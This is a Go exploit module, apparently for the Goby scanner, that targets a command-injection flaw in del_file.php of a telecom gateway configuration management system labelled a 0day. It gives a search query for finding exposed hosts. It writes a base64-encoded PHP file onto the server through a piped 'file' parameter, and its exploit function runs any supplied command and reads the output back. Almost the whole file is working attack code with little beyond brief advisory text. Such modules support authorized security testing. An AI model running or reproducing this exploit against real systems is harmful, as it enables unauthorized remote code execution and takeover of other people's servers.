package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Telecom Gateway Configuration Management System  del_file.php Command Execution",
    "Description": "<p>Shenzhen Huashi Meida Information Technology Co., Ltd. is a professional interactive video high-tech enterprise integrating R&amp;D, production, sales, installation and service. There is a command execution vulnerability in the telecom gateway configuration management system.</p>",
    "Product": "Shenzhen Huashi Meida Information Technology Co., Ltd. - Telecom Gateway Configuration Management System",
    "Homepage": "http://www.hassmedia.com",
    "DisclosureDate": "2022-11-17",
    "Author": "conan24",
    "FofaQuery": "body=\"a:link{text-decoration:none;color:orange;}\"",
    "GobyQuery": "body=\"a:link{text-decoration:none;color:orange;}\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.hassmedia.com\">http://www.hassmedia.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://fofamini.com/"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyAyMzM7dW5saW5rKF9fRklMRV9fKTs/Pg==%20|%20base64%20-d%20>%20gggbbb.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/manager/newtpl/gggbbb.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "233",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/manager/newtpl/del_file.php?file=1.txt|{{{cmd}}}>2.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/manager/newtpl/2.txt",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.3",
    "Translation": {
        "CN": {
            "Name": "电信网关配置管理系统  del_file.php 命令执行",
            "Product": "深圳华视美达信息技术有限公司-电信网关配置管理系统",
            "Description": "<p>深圳华视美达信息技术有限公司是一家集研发、生产、销售、安装及服务于一体的专业互动视讯高科技企业。 电信网关配置管理系统存在命令执行漏洞。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.hassmedia.com\">http://www.hassmedia.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Telecom Gateway Configuration Management System  del_file.php Command Execution",
            "Product": "Shenzhen Huashi Meida Information Technology Co., Ltd. - Telecom Gateway Configuration Management System",
            "Description": "<p>Shenzhen Huashi Meida Information Technology Co., Ltd. is a professional interactive video high-tech enterprise integrating R&amp;D, production, sales, installation and service. There is a command execution vulnerability in the telecom gateway configuration management system.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.hassmedia.com\">http://www.hassmedia.com</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri1 := "/manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyBtZDUoJzIzMycpO3VubGluayhfX0ZJTEVfXyk7Pz4KCg==%20|%20base64%20-d%20>%20gggbbb.php"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/manager/newtpl/gggbbb.php"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43") {
					return true
				}
			}

			uri3 := "/newlive/manager/newtpl/del_file.php?file=1.txt|echo%20PD9waHAgZWNobyBtZDUoJzIzMycpO3VubGluayhfX0ZJTEVfXyk7Pz4KCg==%20|%20base64%20-d%20>%20gggbbb.php"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && resp3.StatusCode == 200 {
				uri4 := "/newlive/manager/newtpl/gggbbb.php"
				cfg4 := httpclient.NewGetRequestConfig(uri4)
				cfg4.VerifyTls = false
				cfg4.FollowRedirect = false
				if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil && resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "e165421110ba03099a1c0393373c5b43") {
					return true
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)

			uri1 := fmt.Sprintf("/manager/newtpl/del_file.php?file=1.txt|%s>2.txt", cmd)
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 200 {
				uri2 := "/manager/newtpl/2.txt"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}

			uri3 := fmt.Sprintf("/newlive/manager/newtpl/del_file.php?file=1.txt|%s>2.txt", cmd)
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
				uri4 := "/newlive/manager/newtpl/2.txt"
				cfg4 := httpclient.NewGetRequestConfig(uri4)
				cfg4.VerifyTls = false
				cfg4.FollowRedirect = false
				if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil && resp4.StatusCode == 200 {
					expResult.Output = resp4.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
